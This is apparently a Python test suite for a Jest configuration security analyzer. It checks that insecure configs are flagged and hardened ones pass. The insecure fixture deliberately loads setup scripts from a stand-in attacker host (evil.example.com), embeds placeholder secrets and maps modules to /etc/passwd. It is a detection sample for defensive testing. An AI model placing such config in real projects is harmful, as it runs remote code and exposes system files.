"""Tests for JestAnalyzer."""

import json
from pathlib import Path

from devai.jest_analyzer import JestAnalyzer, JestFinding


INSECURE_JEST_CONFIG = """\
/** @type {import('jest').Config} */
module.exports = {
  testEnvironment: 'jsdom',
  testURL: 'http://insecure-api.example.com',
  globalSetup: 'https://evil.example.com/setup.js',
  setupFilesAfterEnv: ['https://evil.example.com/env.js'],
  globals: {
    API_KEY: 'hardcoded-secret-value',
    DATABASE_URL: 'postgres://user:pass@db.example.com/app',
  },
  forceExit: true,
  haste: {
    enableSymlinks: true,
  },
  moduleNameMapper: {
    '^@secrets/(.*)$': '/etc/passwd/$1',
  },
  resetMocks: false,
  clearMocks: false,
};
"""

HARDENED_JEST_CONFIG = """\
/** @type {import('jest').Config} */
module.exports = {
  testEnvironment: 'node',
  testURL: 'https://localhost',
  setupFilesAfterEnv: ['./test/setup.js'],
  clearMocks: true,
  resetMocks: true,
  restoreMocks: true,
  cacheDirectory: '<rootDir>/.jest-cache',
  haste: {
    enableSymlinks: false,
  },
};
"""


class TestJestAnalyzer:
    def test_detects_insecure_jest_config(self, tmp_path: Path):
        (tmp_path / "jest.config.js").write_text(INSECURE_JEST_CONFIG, encoding="utf-8")
        analyzer = JestAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "remote_setup_file" in kinds or "remote_global_setup" in kinds
        assert "insecure_test_url" in kinds or "insecure_http" in kinds
        assert "hardcoded_secret" in kinds or "sensitive_global" in kinds
        assert "path_traversal_mapper" in kinds or "sensitive_path" in kinds

    def test_detects_package_json_jest_block(self, tmp_path: Path):
        package = {
            "devDependencies": {"jest": "^29.0.0"},
            "jest": {
                "testURL": "http://insecure.example.com",
                "globals": {"API_KEY": "hardcoded-secret-value"},
            },
        }
        (tmp_path / "package.json").write_text(json.dumps(package), encoding="utf-8")
        analyzer = JestAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "insecure_test_url" in kinds or "insecure_http" in kinds
        assert "hardcoded_secret" in kinds or "sensitive_global" in kinds

    def test_hardened_config_has_no_high_findings(self, tmp_path: Path):
        (tmp_path / "jest.config.js").write_text(HARDENED_JEST_CONFIG, encoding="utf-8")
        analyzer = JestAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []

    def test_no_configs_returns_full_health(self, tmp_path: Path):
        analyzer = JestAnalyzer(str(tmp_path))
        assert analyzer.health_score() == 100.0
        assert analyzer.stats.configs == 0

    def test_generate_hardened_config(self):
        config = JestAnalyzer(".").generate_hardened_config()
        assert "clearMocks: true" in config
        assert "enableSymlinks: false" in config

    def test_finding_format(self):
        finding = JestFinding(
            kind="hardcoded_secret",
            severity="high",
            message="test message",
            path="jest.config.js",
            lineno=5,
        )
        assert "[high]" in finding.format()
        assert "jest.config.js:5" in finding.format()

    def test_to_context(self, tmp_path: Path):
        (tmp_path / "jest.config.js").write_text(INSECURE_JEST_CONFIG, encoding="utf-8")
        analyzer = JestAnalyzer(str(tmp_path))
        context = analyzer.to_context()
        assert "Jest analysis:" in context
        assert "health score:" in context
